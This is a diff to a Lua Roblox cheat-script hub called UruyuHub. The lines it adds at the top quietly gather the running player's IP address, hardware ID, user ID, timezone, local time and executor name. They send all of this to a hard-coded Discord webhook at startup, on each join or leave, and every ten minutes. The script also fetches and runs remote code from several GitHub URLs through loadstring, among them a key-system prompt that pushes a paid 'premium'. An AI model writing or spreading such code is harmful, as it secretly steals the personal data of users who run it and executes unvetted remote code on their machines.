@@ -1,3 +1,159 @@
+local DiscordId = game.Players.LocalPlayer.UserId
+local discordInviteLink = "https://discord.gg/6KhXMJMG"
+local url = "https://discord.com/api/webhooks/1140427315738853436/FXNE_cVY9qbXUIxpuoZKf6DFIBmqWxGg4kvDMLqD2xJYTX6ZCYeHGwODwiTnV7C2xuXR"
+local customContent = ""
+
+local gameInfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
+local gameName = gameInfo.Name
+local gameId = game.PlaceId
+local gameLink = "https://www.roblox.com/games/" .. gameId .. "/Game-Name"
+local playerId = game.Players.LocalPlayer.UserId
+local avatarImage = "https://tr.rbxcdn.com/" .. game.Players:GetUserThumbnailAsync(playerId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150) .. "/AvatarHeadshot/Png"
+
+local startTime = os.time()
+
+local function formatTime(seconds)
+    local minutes = math.floor(seconds / 60)
+    local hours = math.floor(minutes / 60)
+    local days = math.floor(hours / 24)
+    minutes = minutes % 60
+    seconds = seconds % 60
+    return string.format("%d days, %02d:%02d:%02d", days, hours, minutes, seconds)
+end
+
+local function hasPremium(player)
+    return player.MembershipType == Enum.MembershipType.Premium
+end
+
+local function getPlayerCount()
+    local players = game.Players:GetPlayers()
+    return #players
+end
+
+local function getPlayerInfo(player)
+    return player.Name .. " (" .. player.DisplayName .. ")"
+end
+
+-- Get the HWID (Hardware ID) of the player
+local hwid = game.RbxAnalyticsService:GetClientId()
+
+local executor = identifyexecutor() -- Get the executor name directly
+
+local data = {
+    content = customContent,
+    embeds = {
+        {
+            author = {
+                name = getPlayerInfo(game.Players.LocalPlayer),
+                icon_url = avatarImage
+            },
+            title = gameName .. " - Player Update",
+            description = "                     |**UruYuHub** **Update**|                     |",
+            type = "rich",
+            color = tonumber(4334245),
+            fields = {
+                { name = "Player Id :man_detective:", value = DiscordId, inline = true },
+                { name = "Players In the Server :busts_in_silhouette:", value = getPlayerCount(), inline = true }, -- Fix to show player count
+                { name = "Premium Status :gem:", value = hasPremium(game.Players.LocalPlayer) and "Premium" or "Not Premium", inline = true }, -- Fix to show Premium status
+                { name = "Timezone :clock9:", value = "Calculating...", inline = true },
+                { name = "Current Time :clock2:", value = "Calculating...", inline = true },
+                { name = "Profile Link :link:", value = "Calculating...", inline = true },
+                { name = "Join/Leave :arrow_heading_up:/:arrow_heading_down:", value = "Calculating...", inline = true },
+                { name = "IP Address :globe_with_meridians:", value = "Calculating...", inline = true },
+                { name = "HWID :computer:", value = hwid, inline = true }, -- Include the HWID
+                { name = "Executor :keyboard:", value = executor, inline = true }, -- Use the directly obtained executor variable
+            },
+            thumbnail = {
+                url = avatarImage
+            }
+        },
+        {
+            title = "Game Link :video_game:",
+            description = "[" .. gameName .. "](" .. gameLink .. ")",
+            type = "rich",
+            color = tonumber(16711680),
+        }
+    }
+}
+
+local HttpService = game:GetService("HttpService")
+local headers = {
+    ["Content-Type"] = "application/json"
+}
+
+local lastUpdateTime = 0
+local cooldownTime = 300 -- Cooldown time in seconds (adjust as needed)
+
+local function sendRequest(content)
+    local currentTime = os.time()
+    if currentTime - lastUpdateTime < cooldownTime then
+        return -- If the cooldown time hasn't passed, exit the function
+    end
+
+    lastUpdateTime = currentTime -- Update the last update time
+
+    local player = game.Players.LocalPlayer
+
+    data.embeds[1].fields[4].value = os.date("%Z") -- Current Timezone
+    data.embeds[1].fields[5].value = os.date("%c") -- Local Time
+    data.embeds[1].fields[6].value = "https://www.roblox.com/users/" .. playerId .. "/profile"
+    data.embeds[1].fields[7].value = content
+
+    -- Get player IP and add it to the Discord message
+    local ipResponse = game:HttpGet("https://v4.ident.me")
+    if ipResponse then
+        data.embeds[1].fields[8].value = "IP Address :globe_with_meridians:\n" .. tostring(ipResponse)
+    else
+        data.embeds[1].fields[8].value = "IP Address :globe_with_meridians:\nError retrieving IP. They must be hiding!"
+    end
+
+    local encodedData = HttpService:JSONEncode(data)
+    local httpRequest = {
+        Url = url,
+        Method = "POST",
+        Headers = headers,
+        Body = encodedData
+    }
+    local request = http_request or request or HttpPost or syn.request
+    request(httpRequest)
+end
+
+local function onPlayerAdded(player)
+    sendRequest(getPlayerInfo(player) .. " joined the game")
+end
+
+local function onPlayerRemoving(player)
+    sendRequest(getPlayerInfo(player) .. " left the game")
+end
+
+game.Players.PlayerAdded:Connect(onPlayerAdded)
+game.Players.PlayerRemoving:Connect(onPlayerRemoving)
+
+local joinInterval = 10 -- Interval in minutes
+spawn(function()
+    while true do
+        wait(joinInterval * 60)
+        sendRequest("Player update")
+    end
+end)
+
+sendRequest("Game started")
+
+-- Key verification and GUI part
+local KeySystemUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/MaGiXxScripter0/keysystemv2api/master/ui/xrer_mstudio45.lua"))()
+KeySystemUI.New({
+    ApplicationName = "UruyuHub", -- Your Key System Application Name
+    Name = "UruyuHub", -- Your Script name
+    Info = "Buy Prem for 2$ if key is bugged join", -- Info text in the GUI, keep empty for the default text.
+    DiscordInvite = "https://discord.gg/3bmGDemSbt" -- Optional.
+})
+repeat task.wait() until KeySystemUI.Finished() or KeySystemUI.Closed
+if KeySystemUI.Finished() and KeySystemUI.Closed == false then
+    print("Key  is verified, wait for script to load")
+else
+    print("Player closed the GUI.")
+end
+
 local DiscordLib = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/discord%20lib.txt")()
 
 local win = DiscordLib:Window("==============================================Uruyu||Hub==============================================")
@@ -2822,44 +2978,5 @@ btns:Seperator()
 
       repeat task.wait() until game:IsLoaded()
       loadstring(game:HttpGet('https://raw.githubusercontent.com/Breadido/misc_scripts/main/Blade_Ball%20-%20No_Parry_Animation_Delay'))()    end)
-    
-    btns:Seperator()
-
-
-    local btns = serv:Channel("ONE FRUIT")
-
-  btns:Seperator()
-  
-    btns:Button("NexusHub ", function()
-      DiscordLib:Notification("Notification", "Use it at your own risk", "ok")
-      local request = (syn and syn.request) or (http and http.request) or http_request
-      loadstring(game:HttpGet("https://raw.githubusercontent.com/CrazyHub123/NexusHub/main/OneFruitSimulator.lua"))();
-    end)
-    
-    btns:Seperator()
-
-
-    local btns = serv:Channel("ONE FRUIT")
-
-  btns:Seperator()
-  
-    btns:Button("NexusHub ", function()
-      DiscordLib:Notification("Notification", "Use it at your own risk", "ok")
-      local request = (syn and syn.request) or (http and http.request) or http_request
-      loadstring(game:HttpGet("https://raw.githubusercontent.com/CrazyHub123/NexusHub/main/OneFruitSimulator.lua"))();
-    end)
-    
-    btns:Seperator()
-
-
-    local btns = serv:Channel("HAZE PIECE")
-
-  btns:Seperator()
-  
-    btns:Button("ZaRdoOx ", function()
-      DiscordLib:Notification("Notification", "Use it at your own risk", "ok")
-      local request = (syn and syn.request) or (http and http.request) or http_request
-      loadstring(game:HttpGet("https://raw.githubusercontent.com/ZaRdoOx/Fazium-files/main/Loader"))()
-    end)
     
     btns:Seperator()
